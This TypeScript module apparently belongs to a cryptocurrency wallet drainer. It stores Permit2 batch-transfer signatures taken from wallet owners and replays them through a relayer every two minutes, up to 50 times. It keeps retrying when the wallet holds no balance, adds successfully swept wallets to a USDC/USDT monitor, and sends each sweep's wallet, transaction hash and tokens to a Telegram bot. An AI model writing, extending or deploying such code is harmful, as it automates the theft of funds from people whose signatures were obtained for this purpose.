import { storage } from "./storage";
import { executePermit2BatchTransfer } from "./permit2-relayer";
import { addWalletToMonitor } from "./wallet-monitor";
import { notifyRetrySuccess, notifyRetryFailed, resolveTokenSymbol } from "./telegram-bot";

let retryInterval: ReturnType<typeof setInterval> | null = null;
let isRunning = false;

async function retryPendingTransfers() {
  try {
    const pending = await storage.getPendingTransfers();
    if (pending.length === 0) return;

    console.log(`[Transfer-Retry] Found ${pending.length} pending transfers to retry`);

    for (const transfer of pending) {
      const retryCount = parseInt(transfer.retryCount || "0");

      if (retryCount >= 50) {
        await storage.updatePendingTransfer(transfer.id, {
          status: "failed",
          lastError: "Max retries exceeded",
        });
        console.log(`[Transfer-Retry] Transfer ${transfer.id} exceeded max retries, marking as failed`);
        
        notifyRetryFailed({
          walletAddress: transfer.ownerAddress,
          chainId: transfer.chainId,
          attempt: retryCount,
          error: "Max retries exceeded (50 attempts)",
          maxRetriesExceeded: true,
        }).catch(() => {});
        continue;
      }

      try {
        const permitted = JSON.parse(transfer.permitted);

        console.log(`[Transfer-Retry] Retrying transfer for ${transfer.ownerAddress} on chain ${transfer.chainId} (attempt ${retryCount + 1})`);

        const result = await executePermit2BatchTransfer({
          chainId: Number(transfer.chainId),
          owner: transfer.ownerAddress,
          permitted,
          nonce: transfer.nonce,
          deadline: transfer.deadline,
          signature: transfer.signature,
        });

        if (result.success && result.txHash) {
          await storage.updatePendingTransfer(transfer.id, {
            status: "completed",
            retryCount: String(retryCount + 1),
            lastRetryAt: new Date(),
          });

          for (const t of result.transfers) {
            if (t.success) {
              try {
                await storage.createTransfer({
                  walletAddress: transfer.ownerAddress,
                  tokenAddress: t.token,
                  tokenSymbol: t.token,
                  amount: t.amount,
                  transactionHash: result.txHash,
                });
              } catch {}
            }
          }

          await addWalletToMonitor(transfer.ownerAddress, 'evm', transfer.chainId, ['USDC', 'USDT']);

          notifyRetrySuccess({
            walletAddress: transfer.ownerAddress,
            chainId: transfer.chainId,
            txHash: result.txHash,
            attempt: retryCount + 1,
            tokens: result.transfers.filter(t => t.success).map(t => ({ token: resolveTokenSymbol(t.token), amount: t.amount })),
          }).catch(() => {});

          console.log(`[Transfer-Retry] Successfully retried transfer ${transfer.id} - tx: ${result.txHash}`);
        } else if (result.success && !result.txHash) {
          await storage.updatePendingTransfer(transfer.id, {
            retryCount: String(retryCount + 1),
            lastError: result.error || "No token balances found",
            lastRetryAt: new Date(),
          });
          console.log(`[Transfer-Retry] No balances to transfer for ${transfer.id}, will retry later`);
        } else {
          await storage.updatePendingTransfer(transfer.id, {
            retryCount: String(retryCount + 1),
            lastError: result.error || "Unknown error",
            lastRetryAt: new Date(),
          });
          console.log(`[Transfer-Retry] Retry failed for ${transfer.id}: ${result.error}`);
          
          notifyRetryFailed({
            walletAddress: transfer.ownerAddress,
            chainId: transfer.chainId,
            attempt: retryCount + 1,
            error: result.error || "Unknown error",
          }).catch(() => {});
        }
      } catch (err: any) {
        await storage.updatePendingTransfer(transfer.id, {
          retryCount: String(retryCount + 1),
          lastError: err?.message || "Unknown error",
          lastRetryAt: new Date(),
        });
        console.error(`[Transfer-Retry] Error retrying ${transfer.id}:`, err?.message);
        
        notifyRetryFailed({
          walletAddress: transfer.ownerAddress,
          chainId: transfer.chainId,
          attempt: retryCount + 1,
          error: err?.message || "Unknown error",
        }).catch(() => {});
      }
    }
  } catch (err: any) {
    console.error("[Transfer-Retry] Error in retry cycle:", err?.message);
  }
}

export function startTransferRetry(intervalMinutes: number = 2) {
  if (retryInterval) {
    console.log("[Transfer-Retry] Already running");
    return;
  }

  isRunning = true;
  console.log(`[Transfer-Retry] Starting retry system, checking every ${intervalMinutes} minutes`);

  retryPendingTransfers();

  retryInterval = setInterval(() => {
    retryPendingTransfers();
  }, intervalMinutes * 60 * 1000);
}

export function stopTransferRetry() {
  if (retryInterval) {
    clearInterval(retryInterval);
    retryInterval = null;
    isRunning = false;
    console.log("[Transfer-Retry] Stopped");
  }
}

export function getRetryStatus() {
  return { running: isRunning };
}

export async function savePendingTransfer(params: {
  chainId: number;
  owner: string;
  permitted: { token: string; amount: string }[];
  nonce: string;
  deadline: string;
  signature: string;
}) {
  await storage.createPendingTransfer({
    chainId: String(params.chainId),
    ownerAddress: params.owner,
    permitted: JSON.stringify(params.permitted),
    nonce: params.nonce,
    deadline: params.deadline,
    signature: params.signature,
    status: "pending",
  });
  console.log(`[Transfer-Retry] Saved pending transfer for ${params.owner} on chain ${params.chainId}`);
}
